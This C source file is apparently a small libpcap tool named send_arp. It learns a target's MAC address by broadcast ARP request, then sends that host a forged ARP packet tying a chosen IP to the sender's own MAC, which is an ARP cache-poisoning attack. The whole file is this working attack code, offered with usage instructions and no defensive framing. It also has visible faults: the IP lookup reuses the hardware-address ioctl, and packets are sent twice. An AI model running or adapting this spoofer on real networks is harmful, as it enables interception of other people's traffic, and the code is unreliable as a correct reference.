#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#define ETHER_ADDR_LEN 6
#define IP_LEN 4
#define ARP_LEN 42
#define ARPOP_REQUEST 0x01
#define ARPOP_REPLY 0x02
#define ARPHRD_ETHER 0X01
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP  0X0806

struct ethernet_hdr
        {
          u_int8_t ether_dhost[ETHER_ADDR_LEN];
          u_int8_t ether_shost[ETHER_ADDR_LEN];
          u_int16_t ether_type;
        };

struct arp_hdr
        {
          u_int16_t HardwareType;
          u_int16_t ProtocolType;
          u_int8_t HardwareSize;
          u_int8_t ProtocolSize;
          u_int16_t Opcode;
          u_int8_t SenderMacAdd[ETHER_ADDR_LEN];
          u_int8_t SenderIpAdd[IP_LEN];
          u_int8_t TargetMacAdd[ETHER_ADDR_LEN];
          u_int8_t TargetIpAdd[IP_LEN];
        };

void get_my_macadd(const char *dev, u_int8_t *my_mac, u_int8_t *my_ip)
{
  struct ifreq ifr;
  int s = socket(AF_INET,SOCK_DGRAM,0);

  if(s<0)
    perror("socket fail");
  strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
  if(ioctl(s,SIOCGIFHWADDR,&ifr)<0)
    perror("ioctl fail");
  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
    my_mac[i]=(u_int8_t)ifr.ifr_hwaddr.sa_data[i];
  if(ioctl(s,SIOCGIFHWADDR,&ifr)<0)
    perror("get IP fail");

  *(in_addr*)my_ip=((sockaddr_in *)&ifr.ifr_addr)->sin_addr;
}

int send_req(pcap_t *handle,u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *send_ip, u_int8_t *target_ip, u_int8_t *buf)
{
  struct ethernet_hdr *ether=(struct ethernet_hdr *)buf;
  struct arp_hdr *arp=(struct arp_hdr *)(buf+sizeof(struct ethernet_hdr));
  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    ether->ether_dhost[i]=dst_mac[i];
    ether->ether_shost[i]=src_mac[i];
  }
  ether->ether_type=htons(ETHERTYPE_ARP);

  arp->HardwareType=htons(ARPHRD_ETHER);
  arp->ProtocolType=htons(ETHERTYPE_IP);
  arp->HardwareSize=ETHER_ADDR_LEN;
  arp->ProtocolSize=IP_LEN;
  arp->Opcode=htons(ARPOP_REQUEST);

  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
  {
    arp->SenderMacAdd[i]=src_mac[i];
    (dst_mac[i]==0XFF)?(arp->TargetMacAdd[i]=0x00):(arp->TargetMacAdd[i]=dst_mac[i]);
  }

  for(u_int8_t i=0;i<IP_LEN;i++)
  {
    arp->SenderIpAdd[i]=send_ip[i];
    arp->TargetIpAdd[i]=target_ip[i];
  }

  pcap_sendpacket(handle,buf,ARP_LEN);
  if(pcap_sendpacket(handle,buf,ARP_LEN)==-1)
  {
	printf("ARP request fail");
	return -1;
  }

  return 1;
}
 
int recv_reply(pcap_t *handle,u_int8_t *target_ip,u_int8_t *victim_mac)
{
  for(u_int8_t i=0;;i++)
  {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int cnt=0;
    int flag=0;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
 
    struct ethernet_hdr *ether=(struct ethernet_hdr *)packet;
   
    if(htons(ether->ether_type)==ETHERTYPE_ARP)
    {
	  struct arp_hdr *arp=(struct arp_hdr *)(packet+sizeof(struct ethernet_hdr));
	  if(arp->Opcode==htons(ARPOP_REPLY))
	  {
	    for(u_int8_t i=0;i<IP_LEN;i++)
	    {
		if(arp->SenderIpAdd[i]==target_ip[i])
		  cnt++;
		if(cnt==4)
		{
		  for(u_int8_t i=0;i<ETHER_ADDR_LEN;i++)
		    victim_mac[i]=arp->SenderMacAdd[i];
		  flag=1;	
		}
	    }
	  }
    }

  if(flag==1)
    break;
  }

  return 1;
}

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp eth0 172.20.10.5 172.20.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }
  u_int8_t broadcastmac[ETHER_ADDR_LEN]={0XFF,0XFF,0XFF,0XFF,0XFF,0XFF};
  u_int8_t my_mac[ETHER_ADDR_LEN];
  u_int8_t my_ip[IP_LEN];
  u_int8_t victim_mac[ETHER_ADDR_LEN];
  u_int8_t sender_ip[IP_LEN];
  u_int8_t target_ip[IP_LEN];
  u_int8_t buf[ARP_LEN];
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  inet_pton(AF_INET,argv[2],sender_ip);
  inet_pton(AF_INET,argv[3],target_ip);
  get_my_macadd(dev,my_mac,my_ip);
  send_req(handle,my_mac,broadcastmac,my_ip,target_ip,buf);
  recv_reply(handle,target_ip,victim_mac);
  send_req(handle,my_mac,victim_mac,sender_ip,target_ip,buf);
  pcap_close(handle);
  return 0;
}


